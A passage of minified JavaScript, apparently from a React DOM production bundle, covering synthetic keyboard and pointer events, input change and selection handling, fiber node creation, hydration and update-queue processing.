        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified"
    }, xk = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta"
    }, wk = {
        Alt: "altKey",
        Control: "ctrlKey",
        Meta: "metaKey",
        Shift: "shiftKey"
    };
    function vk(c) {
        var u = this.nativeEvent;
        return u.getModifierState ? u.getModifierState(c) : (c = wk[c]) ? !!u[c] : !1
    }
    function Wx() {
        return vk
    }
    var Tk = h({}, uh, {
        key: function(c) {
            if (c.key) {
                var u = mk[c.key] || c.key;
                if (u !== "Unidentified")
                    return u
            }
            return c.type === "keypress" ? (c = q0(c),
            c === 13 ? "Enter" : String.fromCharCode(c)) : c.type === "keydown" || c.type === "keyup" ? xk[c.keyCode] || "Unidentified" : ""
        },
        code: 0,
        location: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        repeat: 0,
        locale: 0,
        getModifierState: Wx,
        charCode: function(c) {
            return c.type === "keypress" ? q0(c) : 0
        },
        keyCode: function(c) {
            return c.type === "keydown" || c.type === "keyup" ? c.keyCode : 0
        },
        which: function(c) {
            return c.type === "keypress" ? q0(c) : c.type === "keydown" || c.type === "keyup" ? c.keyCode : 0
        }
    })
      , Ek = To(Tk)
      , Ak = h({}, G0, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0
    })
      , Z4 = To(Ak)
      , Pk = h({}, uh, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: Wx
    })
      , Ck = To(Pk)
      , Sk = h({}, ol, {
        propertyName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    })
      , Bk = To(Sk)
      , _k = h({}, G0, {
        deltaX: function(c) {
            return "deltaX"in c ? c.deltaX : "wheelDeltaX"in c ? -c.wheelDeltaX : 0
        },
        deltaY: function(c) {
            return "deltaY"in c ? c.deltaY : "wheelDeltaY"in c ? -c.wheelDeltaY : "wheelDelta"in c ? -c.wheelDelta : 0
        },
        deltaZ: 0,
        deltaMode: 0
    })
      , Ik = To(_k)
      , Ok = h({}, ol, {
        newState: 0,
        oldState: 0
    })
      , Rk = To(Ok)
      , Wk = [9, 13, 27, 32]
      , Mx = ta && "CompositionEvent"in window
      , dh = null;
    ta && "documentMode"in document && (dh = document.documentMode);
    var Mk = ta && "TextEvent"in window && !dh
      , Y4 = ta && (!Mx || dh && 8 < dh && 11 >= dh)
      , X4 = " "
      , J4 = !1;
    function Q4(c, u) {
        switch (c) {
        case "keyup":
            return Wk.indexOf(u.keyCode) !== -1;
        case "keydown":
            return u.keyCode !== 229;
        case "keypress":
        case "mousedown":
        case "focusout":
            return !0;
        default:
            return !1
        }
    }
    function eP(c) {
        return c = c.detail,
        typeof c == "object" && "data"in c ? c.data : null
    }
    var Fu = !1;
    function Nk(c, u) {
        switch (c) {
        case "compositionend":
            return eP(u);
        case "keypress":
            return u.which !== 32 ? null : (J4 = !0,
            X4);
        case "textInput":
            return c = u.data,
            c === X4 && J4 ? null : c;
        default:
            return null
        }
    }
    function Dk(c, u) {
        if (Fu)
            return c === "compositionend" || !Mx && Q4(c, u) ? (c = V4(),
            j0 = _x = Za = null,
            Fu = !1,
            c) : null;
        switch (c) {
        case "paste":
            return null;
        case "keypress":
            if (!(u.ctrlKey || u.altKey || u.metaKey) || u.ctrlKey && u.altKey) {
                if (u.char && 1 < u.char.length)
                    return u.char;
                if (u.which)
                    return String.fromCharCode(u.which)
            }
            return null;
        case "compositionend":
            return Y4 && u.locale !== "ko" ? null : u.data;
        default:
            return null
        }
    }
    var Fk = {
        color: !0,
        date: !0,
        datetime: !0,
        "datetime-local": !0,
        email: !0,
        month: !0,
        number: !0,
        password: !0,
        range: !0,
        search: !0,
        tel: !0,
        text: !0,
        time: !0,
        url: !0,
        week: !0
    };
    function tP(c) {
        var u = c && c.nodeName && c.nodeName.toLowerCase();
        return u === "input" ? !!Fk[c.type] : u === "textarea"
    }
    function rP(c, u, d, g) {
        Nu ? Du ? Du.push(g) : Du = [g] : Nu = g,
        u = Wg(u, "onChange"),
        0 < u.length && (d = new H0("onChange","change",null,d,g),
        c.push({
            event: d,
            listeners: u
        }))
    }
    var hh = null
      , ph = null;
    function Uk(c) {
        D6(c, 0)
    }
    function K0(c) {
        var u = Ht(c);
        if (F4(u))
            return c
    }
    function nP(c, u) {
        if (c === "change")
            return u
    }
    var oP = !1;
    if (ta) {
        var Nx;
        if (ta) {
            var Dx = "oninput"in document;
            if (!Dx) {
                var iP = document.createElement("div");
                iP.setAttribute("oninput", "return;"),
                Dx = typeof iP.oninput == "function"
            }
            Nx = Dx
        } else
            Nx = !1;
        oP = Nx && (!document.documentMode || 9 < document.documentMode)
    }
    function sP() {
        hh && (hh.detachEvent("onpropertychange", aP),
        ph = hh = null)
    }
    function aP(c) {
        if (c.propertyName === "value" && K0(ph)) {
            var u = [];
            rP(u, ph, c, Cx(c)),
            q4(Uk, u)
        }
    }
    function kk(c, u, d) {
        c === "focusin" ? (sP(),
        hh = u,
        ph = d,
        hh.attachEvent("onpropertychange", aP)) : c === "focusout" && sP()
    }
    function Lk(c) {
        if (c === "selectionchange" || c === "keyup" || c === "keydown")
            return K0(ph)
    }
    function $k(c, u) {
        if (c === "click")
            return K0(u)
    }
    function zk(c, u) {
        if (c === "input" || c === "change")
            return K0(u)
    }
    function jk(c, u) {
        return c === u && (c !== 0 || 1 / c === 1 / u) || c !== c && u !== u
    }
    var Vo = typeof Object.is == "function" ? Object.is : jk;
    function gh(c, u) {
        if (Vo(c, u))
            return !0;
        if (typeof c != "object" || c === null || typeof u != "object" || u === null)
            return !1;
        var d = Object.keys(c)
          , g = Object.keys(u);
        if (d.length !== g.length)
            return !1;
        for (g = 0; g < d.length; g++) {
            var w = d[g];
            if (!Tt.call(u, w) || !Vo(c[w], u[w]))
                return !1
        }
        return !0
    }
    function cP(c) {
        for (; c && c.firstChild; )
            c = c.firstChild;
        return c
    }
    function lP(c, u) {
        var d = cP(c);
        c = 0;
        for (var g; d; ) {
            if (d.nodeType === 3) {
                if (g = c + d.textContent.length,
                c <= u && g >= u)
                    return {
                        node: d,
                        offset: u - c
                    };
                c = g
            }
            e: {
                for (; d; ) {
                    if (d.nextSibling) {
                        d = d.nextSibling;
                        break e
                    }
                    d = d.parentNode
                }
                d = void 0
            }
            d = cP(d)
        }
    }
    function uP(c, u) {
        return c && u ? c === u ? !0 : c && c.nodeType === 3 ? !1 : u && u.nodeType === 3 ? uP(c, u.parentNode) : "contains"in c ? c.contains(u) : c.compareDocumentPosition ? !!(c.compareDocumentPosition(u) & 16) : !1 : !1
    }
    function fP(c) {
        c = c != null && c.ownerDocument != null && c.ownerDocument.defaultView != null ? c.ownerDocument.defaultView : window;
        for (var u = $0(c.document); u instanceof c.HTMLIFrameElement; ) {
            try {
                var d = typeof u.contentWindow.location.href == "string"
            } catch {
                d = !1
            }
            if (d)
                c = u.contentWindow;
            else
                break;
            u = $0(c.document)
        }
        return u
    }
    function Fx(c) {
        var u = c && c.nodeName && c.nodeName.toLowerCase();
        return u && (u === "input" && (c.type === "text" || c.type === "search" || c.type === "tel" || c.type === "url" || c.type === "password") || u === "textarea" || c.contentEditable === "true")
    }
    var qk = ta && "documentMode"in document && 11 >= document.documentMode
      , Uu = null
      , Ux = null
      , yh = null
      , kx = !1;
    function dP(c, u, d) {
        var g = d.window === d ? d.document : d.nodeType === 9 ? d : d.ownerDocument;
        kx || Uu == null || Uu !== $0(g) || (g = Uu,
        "selectionStart"in g && Fx(g) ? g = {
            start: g.selectionStart,
            end: g.selectionEnd
        } : (g = (g.ownerDocument && g.ownerDocument.defaultView || window).getSelection(),
        g = {
            anchorNode: g.anchorNode,
            anchorOffset: g.anchorOffset,
            focusNode: g.focusNode,
            focusOffset: g.focusOffset
        }),
        yh && gh(yh, g) || (yh = g,
        g = Wg(Ux, "onSelect"),
        0 < g.length && (u = new H0("onSelect","select",null,u,d),
        c.push({
            event: u,
            listeners: g
        }),
        u.target = Uu)))
    }
    function il(c, u) {
        var d = {};
        return d[c.toLowerCase()] = u.toLowerCase(),
        d["Webkit" + c] = "webkit" + u,
        d["Moz" + c] = "moz" + u,
        d
    }
    var ku = {
        animationend: il("Animation", "AnimationEnd"),
        animationiteration: il("Animation", "AnimationIteration"),
        animationstart: il("Animation", "AnimationStart"),
        transitionrun: il("Transition", "TransitionRun"),
        transitionstart: il("Transition", "TransitionStart"),
        transitioncancel: il("Transition", "TransitionCancel"),
        transitionend: il("Transition", "TransitionEnd")
    }
      , Lx = {}
      , hP = {};
    ta && (hP = document.createElement("div").style,
    "AnimationEvent"in window || (delete ku.animationend.animation,
    delete ku.animationiteration.animation,
    delete ku.animationstart.animation),
    "TransitionEvent"in window || delete ku.transitionend.transition);
    function sl(c) {
        if (Lx[c])
            return Lx[c];
        if (!ku[c])
            return c;
        var u = ku[c], d;
        for (d in u)
            if (u.hasOwnProperty(d) && d in hP)
                return Lx[c] = u[d];
        return c
    }
    var pP = sl("animationend")
      , gP = sl("animationiteration")
      , yP = sl("animationstart")
      , Vk = sl("transitionrun")
      , Hk = sl("transitionstart")
      , Gk = sl("transitioncancel")
      , bP = sl("transitionend")
      , mP = new Map
      , $x = "abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");
    $x.push("scrollEnd");
    function qi(c, u) {
        mP.set(c, u),
        Lt(u, [c])
    }
    var xP = new WeakMap;
    function pi(c, u) {
        if (typeof c == "object" && c !== null) {
            var d = xP.get(c);
            return d !== void 0 ? d : (u = {
                value: c,
                source: u,
                stack: ze(u)
            },
            xP.set(c, u),
            u)
        }
        return {
            value: c,
            source: u,
            stack: ze(u)
        }
    }
    var gi = []
      , Lu = 0
      , zx = 0;
    function Z0() {
        for (var c = Lu, u = zx = Lu = 0; u < c; ) {
            var d = gi[u];
            gi[u++] = null;
            var g = gi[u];
            gi[u++] = null;
            var w = gi[u];
            gi[u++] = null;
            var A = gi[u];
            if (gi[u++] = null,
            g !== null && w !== null) {
                var q = g.pending;
                q === null ? w.next = w : (w.next = q.next,
                q.next = w),
                g.pending = w
            }
            A !== 0 && wP(d, w, A)
        }
    }
    function Y0(c, u, d, g) {
        gi[Lu++] = c,
        gi[Lu++] = u,
        gi[Lu++] = d,
        gi[Lu++] = g,
        zx |= g,
        c.lanes |= g,
        c = c.alternate,
        c !== null && (c.lanes |= g)
    }
    function jx(c, u, d, g) {
        return Y0(c, u, d, g),
        X0(c)
    }
    function $u(c, u) {
        return Y0(c, null, null, u),
        X0(c)
    }
    function wP(c, u, d) {
        c.lanes |= d;
        var g = c.alternate;
        g !== null && (g.lanes |= d);
        for (var w = !1, A = c.return; A !== null; )
            A.childLanes |= d,
            g = A.alternate,
            g !== null && (g.childLanes |= d),
            A.tag === 22 && (c = A.stateNode,
            c === null || c._visibility & 1 || (w = !0)),
            c = A,
            A = A.return;
        return c.tag === 3 ? (A = c.stateNode,
        w && u !== null && (w = 31 - U(d),
        c = A.hiddenUpdates,
        g = c[w],
        g === null ? c[w] = [u] : g.push(u),
        u.lane = d | 536870912),
        A) : null
    }
    function X0(c) {
        if (50 < $h)
            throw $h = 0,
            Zw = null,
            Error(o(185));
        for (var u = c.return; u !== null; )
            c = u,
            u = c.return;
        return c.tag === 3 ? c.stateNode : null
    }
    var zu = {};
    function Kk(c, u, d, g) {
        this.tag = c,
        this.key = d,
        this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null,
        this.index = 0,
        this.refCleanup = this.ref = null,
        this.pendingProps = u,
        this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null,
        this.mode = g,
        this.subtreeFlags = this.flags = 0,
        this.deletions = null,
        this.childLanes = this.lanes = 0,
        this.alternate = null
    }
    function Ho(c, u, d, g) {
        return new Kk(c,u,d,g)
    }
    function qx(c) {
        return c = c.prototype,
        !(!c || !c.isReactComponent)
    }
    function ra(c, u) {
        var d = c.alternate;
        return d === null ? (d = Ho(c.tag, u, c.key, c.mode),
        d.elementType = c.elementType,
        d.type = c.type,
        d.stateNode = c.stateNode,
        d.alternate = c,
        c.alternate = d) : (d.pendingProps = u,
        d.type = c.type,
        d.flags = 0,
        d.subtreeFlags = 0,
        d.deletions = null),
        d.flags = c.flags & 65011712,
        d.childLanes = c.childLanes,
        d.lanes = c.lanes,
        d.child = c.child,
        d.memoizedProps = c.memoizedProps,
        d.memoizedState = c.memoizedState,
        d.updateQueue = c.updateQueue,
        u = c.dependencies,
        d.dependencies = u === null ? null : {
            lanes: u.lanes,
            firstContext: u.firstContext
        },
        d.sibling = c.sibling,
        d.index = c.index,
        d.ref = c.ref,
        d.refCleanup = c.refCleanup,
        d
    }
    function vP(c, u) {
        c.flags &= 65011714;
        var d = c.alternate;
        return d === null ? (c.childLanes = 0,
        c.lanes = u,
        c.child = null,
        c.subtreeFlags = 0,
        c.memoizedProps = null,
        c.memoizedState = null,
        c.updateQueue = null,
        c.dependencies = null,
        c.stateNode = null) : (c.childLanes = d.childLanes,
        c.lanes = d.lanes,
        c.child = d.child,
        c.subtreeFlags = 0,
        c.deletions = null,
        c.memoizedProps = d.memoizedProps,
        c.memoizedState = d.memoizedState,
        c.updateQueue = d.updateQueue,
        c.type = d.type,
        u = d.dependencies,
        c.dependencies = u === null ? null : {
            lanes: u.lanes,
            firstContext: u.firstContext
        }),
        c
    }
    function J0(c, u, d, g, w, A) {
        var q = 0;
        if (g = c,
        typeof c == "function")
            qx(c) && (q = 1);
        else if (typeof c == "string")
            q = YL(c, d, he.current) ? 26 : c === "html" || c === "head" || c === "body" ? 27 : 5;
        else
            e: switch (c) {
            case W:
                return c = Ho(31, d, u, w),
                c.elementType = W,
                c.lanes = A,
                c;
            case T:
                return al(d.children, w, A, u);
            case x:
                q = 8,
                w |= 24;
                break;
            case E:
                return c = Ho(12, d, u, w | 2),
                c.elementType = E,
                c.lanes = A,
                c;
            case D:
                return c = Ho(13, d, u, w),
                c.elementType = D,
                c.lanes = A,
                c;
            case I:
                return c = Ho(19, d, u, w),
                c.elementType = I,
                c.lanes = A,
                c;
            default:
                if (typeof c == "object" && c !== null)
                    switch (c.$$typeof) {
                    case B:
                    case O:
                        q = 10;
                        break e;
                    case P:
                        q = 9;
                        break e;
                    case F:
                        q = 11;
                        break e;
                    case M:
                        q = 14;
                        break e;
                    case C:
                        q = 16,
                        g = null;
                        break e
                    }
                q = 29,
                d = Error(o(130, c === null ? "null" : typeof c, "")),
                g = null
            }
        return u = Ho(q, d, u, w),
        u.elementType = c,
        u.type = g,
        u.lanes = A,
        u
    }
    function al(c, u, d, g) {
        return c = Ho(7, c, g, u),
        c.lanes = d,
        c
    }
    function Vx(c, u, d) {
        return c = Ho(6, c, null, u),
        c.lanes = d,
        c
    }
    function Hx(c, u, d) {
        return u = Ho(4, c.children !== null ? c.children : [], c.key, u),
        u.lanes = d,
        u.stateNode = {
            containerInfo: c.containerInfo,
            pendingChildren: null,
            implementation: c.implementation
        },
        u
    }
    var ju = []
      , qu = 0
      , Q0 = null
      , eg = 0
      , yi = []
      , bi = 0
      , cl = null
      , na = 1
      , oa = "";
    function ll(c, u) {
        ju[qu++] = eg,
        ju[qu++] = Q0,
        Q0 = c,
        eg = u
    }
    function TP(c, u, d) {
        yi[bi++] = na,
        yi[bi++] = oa,
        yi[bi++] = cl,
        cl = c;
        var g = na;
        c = oa;
        var w = 32 - U(g) - 1;
        g &= ~(1 << w),
        d += 1;
        var A = 32 - U(u) + w;
        if (30 < A) {
            var q = w - w % 5;
            A = (g & (1 << q) - 1).toString(32),
            g >>= q,
            w -= q,
            na = 1 << 32 - U(u) + w | d << w | g,
            oa = A + c
        } else
            na = 1 << A | d << w | g,
            oa = c
    }
    function Gx(c) {
        c.return !== null && (ll(c, 1),
        TP(c, 1, 0))
    }
    function Kx(c) {
        for (; c === Q0; )
            Q0 = ju[--qu],
            ju[qu] = null,
            eg = ju[--qu],
            ju[qu] = null;
        for (; c === cl; )
            cl = yi[--bi],
            yi[bi] = null,
            oa = yi[--bi],
            yi[bi] = null,
            na = yi[--bi],
            yi[bi] = null
    }
    var io = null
      , Gr = null
      , xr = !1
      , ul = null
      , xs = !1
      , Zx = Error(o(519));
    function fl(c) {
        var u = Error(o(418, ""));
        throw xh(pi(u, c)),
        Zx
    }
    function EP(c) {
        var u = c.stateNode
          , d = c.type
          , g = c.memoizedProps;
        switch (u[Ne] = c,
        u[je] = g,
        d) {
        case "dialog":
            Qt("cancel", u),
            Qt("close", u);
            break;
        case "iframe":
        case "object":
        case "embed":
            Qt("load", u);
            break;
        case "video":
        case "audio":
            for (d = 0; d < jh.length; d++)
                Qt(jh[d], u);
            break;
        case "source":
            Qt("error", u);
            break;
        case "img":
        case "image":
        case "link":
            Qt("error", u),
            Qt("load", u);
            break;
        case "details":
            Qt("toggle", u);
            break;
        case "input":
            Qt("invalid", u),
            U4(u, g.value, g.defaultValue, g.checked, g.defaultChecked, g.type, g.name, !0),
            nl(u);
            break;
        case "select":
            Qt("invalid", u);
            break;
        case "textarea":
            Qt("invalid", u),
            L4(u, g.value, g.defaultValue, g.children),
            nl(u)
        }
        d = g.children,
        typeof d != "string" && typeof d != "number" && typeof d != "bigint" || u.textContent === "" + d || g.suppressHydrationWarning === !0 || L6(u.textContent, d) ? (g.popover != null && (Qt("beforetoggle", u),
        Qt("toggle", u)),
        g.onScroll != null && Qt("scroll", u),
        g.onScrollEnd != null && Qt("scrollend", u),
        g.onClick != null && (u.onclick = Mg),
        u = !0) : u = !1,
        u || fl(c)
    }
    function AP(c) {
        for (io = c.return; io; )
            switch (io.tag) {
            case 5:
            case 13:
                xs = !1;
                return;
            case 27:
            case 3:
                xs = !0;
                return;
            default:
                io = io.return
            }
    }
    function bh(c) {
        if (c !== io)
            return !1;
        if (!xr)
            return AP(c),
            xr = !0,
            !1;
        var u = c.tag, d;
        if ((d = u !== 3 && u !== 27) && ((d = u === 5) && (d = c.type,
        d = !(d !== "form" && d !== "button") || fv(c.type, c.memoizedProps)),
        d = !d),
        d && Gr && fl(c),
        AP(c),
        u === 13) {
            if (c = c.memoizedState,
            c = c !== null ? c.dehydrated : null,
            !c)
                throw Error(o(317));
            e: {
                for (c = c.nextSibling,
                u = 0; c; ) {
                    if (c.nodeType === 8)
                        if (d = c.data,
                        d === "/$") {
                            if (u === 0) {
                                Gr = Hi(c.nextSibling);
                                break e
                            }
                            u--
                        } else
                            d !== "$" && d !== "$!" && d !== "$?" || u++;
                    c = c.nextSibling
                }
                Gr = null
            }
        } else
            u === 27 ? (u = Gr,
            fc(c.type) ? (c = gv,
            gv = null,
            Gr = c) : Gr = u) : Gr = io ? Hi(c.stateNode.nextSibling) : null;
        return !0
    }
    function mh() {
        Gr = io = null,
        xr = !1
    }
    function PP() {
        var c = ul;
        return c !== null && (Po === null ? Po = c : Po.push.apply(Po, c),
        ul = null),
        c
    }
    function xh(c) {
        ul === null ? ul = [c] : ul.push(c)
    }
    var Yx = ee(null)
      , dl = null
      , ia = null;
    function Ya(c, u, d) {
        ae(Yx, u._currentValue),
        u._currentValue = d
    }
    function sa(c) {
        c._currentValue = Yx.current,
        ie(Yx)
    }
    function Xx(c, u, d) {
        for (; c !== null; ) {
            var g = c.alternate;
            if ((c.childLanes & u) !== u ? (c.childLanes |= u,
            g !== null && (g.childLanes |= u)) : g !== null && (g.childLanes & u) !== u && (g.childLanes |= u),
            c === d)
                break;
            c = c.return
        }
    }
    function Jx(c, u, d, g) {
        var w = c.child;
        for (w !== null && (w.return = c); w !== null; ) {
            var A = w.dependencies;
            if (A !== null) {
                var q = w.child;
                A = A.firstContext;
                e: for (; A !== null; ) {
                    var Q = A;
                    A = w;
                    for (var ce = 0; ce < u.length; ce++)
                        if (Q.context === u[ce]) {
                            A.lanes |= d,
                            Q = A.alternate,
                            Q !== null && (Q.lanes |= d),
                            Xx(A.return, d, c),
                            g || (q = null);
                            break e
                        }
                    A = Q.next
                }
            } else if (w.tag === 18) {
                if (q = w.return,
                q === null)
                    throw Error(o(341));
                q.lanes |= d,
                A = q.alternate,
                A !== null && (A.lanes |= d),
                Xx(q, d, c),
                q = null
            } else
                q = w.child;
            if (q !== null)
                q.return = w;
            else
                for (q = w; q !== null; ) {
                    if (q === c) {
                        q = null;
                        break
                    }
                    if (w = q.sibling,
                    w !== null) {
                        w.return = q.return,
                        q = w;
                        break
                    }
                    q = q.return
                }
            w = q
        }
    }
    function wh(c, u, d, g) {
        c = null;
        for (var w = u, A = !1; w !== null; ) {
            if (!A) {
                if ((w.flags & 524288) !== 0)
                    A = !0;
                else if ((w.flags & 262144) !== 0)
                    break
            }
            if (w.tag === 10) {
                var q = w.alternate;
                if (q === null)
                    throw Error(o(387));
                if (q = q.memoizedProps,
                q !== null) {
                    var Q = w.type;
                    Vo(w.pendingProps.value, q.value) || (c !== null ? c.push(Q) : c = [Q])
                }
            } else if (w === _e.current) {
                if (q = w.alternate,
                q === null)
                    throw Error(o(387));
                q.memoizedState.memoizedState !== w.memoizedState.memoizedState && (c !== null ? c.push(Zh) : c = [Zh])
            }
            w = w.return
        }
        c !== null && Jx(u, c, d, g),
        u.flags |= 262144
    }
    function tg(c) {
        for (c = c.firstContext; c !== null; ) {
            if (!Vo(c.context._currentValue, c.memoizedValue))
                return !0;
            c = c.next
        }
        return !1
    }
    function hl(c) {
        dl = c,
        ia = null,
        c = c.dependencies,
        c !== null && (c.firstContext = null)
    }
    function Gn(c) {
        return CP(dl, c)
    }
    function rg(c, u) {
        return dl === null && hl(c),
        CP(c, u)
    }
    function CP(c, u) {
        var d = u._currentValue;
        if (u = {
            context: u,
            memoizedValue: d,
            next: null
        },
        ia === null) {
            if (c === null)
                throw Error(o(308));
            ia = u,
            c.dependencies = {
                lanes: 0,
                firstContext: u
            },
            c.flags |= 524288
        } else
            ia = ia.next = u;
        return d
    }
    var Zk = typeof AbortController < "u" ? AbortController : function() {
        var c = []
          , u = this.signal = {
            aborted: !1,
            addEventListener: function(d, g) {
                c.push(g)
            }
        };
        this.abort = function() {
            u.aborted = !0,
            c.forEach(function(d) {
                return d()
            })
        }
    }
      , Yk = r.unstable_scheduleCallback
      , Xk = r.unstable_NormalPriority
      , hn = {
        $$typeof: O,
        Consumer: null,
        Provider: null,
        _currentValue: null,
        _currentValue2: null,
        _threadCount: 0
    };
    function Qx() {
        return {
            controller: new Zk,
            data: new Map,
            refCount: 0
        }
    }
    function vh(c) {
        c.refCount--,
        c.refCount === 0 && Yk(Xk, function() {
            c.controller.abort()
        })
    }
    var Th = null
      , ew = 0
      , Vu = 0
      , Hu = null;
    function Jk(c, u) {
        if (Th === null) {
            var d = Th = [];
            ew = 0,
            Vu = rv(),
            Hu = {
                status: "pending",
                value: void 0,
                then: function(g) {
                    d.push(g)
                }
            }
        }
        return ew++,
        u.then(SP, SP),
        u
    }
    function SP() {
        if (--ew === 0 && Th !== null) {
            Hu !== null && (Hu.status = "fulfilled");
            var c = Th;
            Th = null,
            Vu = 0,
            Hu = null;
            for (var u = 0; u < c.length; u++)
                (0,
                c[u])()
        }
    }
    function Qk(c, u) {
        var d = []
          , g = {
            status: "pending",
            value: null,
            reason: null,
            then: function(w) {
                d.push(w)
            }
        };
        return c.then(function() {
            g.status = "fulfilled",
            g.value = u;
            for (var w = 0; w < d.length; w++)
                (0,
                d[w])(u)
        }, function(w) {
            for (g.status = "rejected",
            g.reason = w,
            w = 0; w < d.length; w++)
                (0,
                d[w])(void 0)
        }),
        g
    }
    var BP = _.S;
    _.S = function(c, u) {
        typeof u == "object" && u !== null && typeof u.then == "function" && Jk(c, u),
        BP !== null && BP(c, u)
    }
    ;
    var pl = ee(null);
    function tw() {
        var c = pl.current;
        return c !== null ? c : Fr.pooledCache
    }
    function ng(c, u) {
        u === null ? ae(pl, pl.current) : ae(pl, u.pool)
    }
    function _P() {
        var c = tw();
        return c === null ? null : {
            parent: hn._currentValue,
            pool: c
        }
    }
    var Eh = Error(o(460))
      , IP = Error(o(474))
      , og = Error(o(542))
      , rw = {
        then: function() {}
    };
    function OP(c) {
        return c = c.status,
        c === "fulfilled" || c === "rejected"
    }
    function ig() {}
    function RP(c, u, d) {
        switch (d = c[d],
        d === void 0 ? c.push(u) : d !== u && (u.then(ig, ig),
        u = d),
        u.status) {
        case "fulfilled":
            return u.value;
        case "rejected":
            throw c = u.reason,
            MP(c),
            c;
        default:
            if (typeof u.status == "string")
                u.then(ig, ig);
            else {
                if (c = Fr,
                c !== null && 100 < c.shellSuspendCounter)
                    throw Error(o(482));
                c = u,
                c.status = "pending",
                c.then(function(g) {
                    if (u.status === "pending") {
                        var w = u;
                        w.status = "fulfilled",
                        w.value = g
                    }
                }, function(g) {
                    if (u.status === "pending") {
                        var w = u;
                        w.status = "rejected",
                        w.reason = g
                    }
                })
            }
            switch (u.status) {
            case "fulfilled":
                return u.value;
            case "rejected":
                throw c = u.reason,
                MP(c),
                c
            }
            throw Ah = u,
            Eh
        }
    }
    var Ah = null;
    function WP() {
        if (Ah === null)
            throw Error(o(459));
        var c = Ah;
        return Ah = null,
        c
    }
    function MP(c) {
        if (c === Eh || c === og)
            throw Error(o(483))
    }
    var Xa = !1;
    function nw(c) {
        c.updateQueue = {
            baseState: c.memoizedState,
            firstBaseUpdate: null,
            lastBaseUpdate: null,
            shared: {
                pending: null,
                lanes: 0,
                hiddenCallbacks: null
            },
            callbacks: null
        }
    }
    function ow(c, u) {
        c = c.updateQueue,
        u.updateQueue === c && (u.updateQueue = {
            baseState: c.baseState,
            firstBaseUpdate: c.firstBaseUpdate,
            lastBaseUpdate: c.lastBaseUpdate,
            shared: c.shared,
            callbacks: null
        })
    }
    function Ja(c) {
        return {
            lane: c,
            tag: 0,
            payload: null,
            callback: null,
            next: null
        }
    }
    function Qa(c, u, d) {
        var g = c.updateQueue;
        if (g === null)
            return null;
        if (g = g.shared,
        (vr & 2) !== 0) {
            var w = g.pending;
            return w === null ? u.next = u : (u.next = w.next,
            w.next = u),
            g.pending = u,
            u = X0(c),
            wP(c, null, d),
            u
        }
        return Y0(c, g, u, d),
        X0(c)
    }
    function Ph(c, u, d) {
        if (u = u.updateQueue,
        u !== null && (u = u.shared,
        (d & 4194048) !== 0)) {
            var g = u.lanes;
            g &= c.pendingLanes,
            d |= g,
            u.lanes = d,
            jr(c, d)
        }
    }
    function iw(c, u) {
        var d = c.updateQueue
          , g = c.alternate;
        if (g !== null && (g = g.updateQueue,
        d === g)) {
            var w = null
              , A = null;
            if (d = d.firstBaseUpdate,
            d !== null) {
                do {
                    var q = {
                        lane: d.lane,
                        tag: d.tag,
                        payload: d.payload,
                        callback: null,
                        next: null
                    };
                    A === null ? w = A = q : A = A.next = q,
                    d = d.next
                } while (d !== null);
                A === null ? w = A = u : A = A.next = u
            } else
                w = A = u;
            d = {
                baseState: g.baseState,
                firstBaseUpdate: w,
                lastBaseUpdate: A,
                shared: g.shared,
                callbacks: g.callbacks
            },
            c.updateQueue = d;
            return
        }
        c = d.lastBaseUpdate,
        c === null ? d.firstBaseUpdate = u : c.next = u,
        d.lastBaseUpdate = u
    }
    var sw = !1;
    function Ch() {
        if (sw) {
            var c = Hu;
            if (c !== null)
                throw c
        }
    }
    function Sh(c, u, d, g) {
        sw = !1;
        var w = c.updateQueue;
        Xa = !1;
        var A = w.firstBaseUpdate
          , q = w.lastBaseUpdate
          , Q = w.shared.pending;
        if (Q !== null) {
            w.shared.pending = null;
            var ce = Q
              , ve = ce.next;
            ce.next = null,
            q === null ? A = ve : q.next = ve,
            q = ce;
            var We = c.alternate;
            We !== null && (We = We.updateQueue,
            Q = We.lastBaseUpdate,
            Q !== q && (Q === null ? We.firstBaseUpdate = ve : Q.next = ve,
            We.lastBaseUpdate = ce))
        }
        if (A !== null) {
            var ke = w.baseState;
            q = 0,
            We = ve = ce = null,
            Q = A;
            do {
                var Se = Q.lane & -536870913
                  , Be = Se !== Q.lane;
                if (Be ? (lr & Se) === Se : (g & Se) === Se) {
                    Se !== 0 && Se === Vu && (sw = !0),
                    We !== null && (We = We.next = {
                        lane: 0,
                        tag: Q.tag,
                        payload: Q.payload,
                        callback: null,
                        next: null
                    });
                    e: {
                        var Ot = c
                          , _t = Q;
                        Se = u;
                        var _r = d;
                        switch (_t.tag) {
                        case 1:
                            if (Ot = _t.payload,
                            typeof Ot == "function") {
                                ke = Ot.call(_r, ke, Se);
                                break e
                            }
                            ke = Ot;
                            break e;
                        case 3:
                            Ot.flags = Ot.flags & -65537 | 128;
                        case 0:
                            if (Ot = _t.payload,
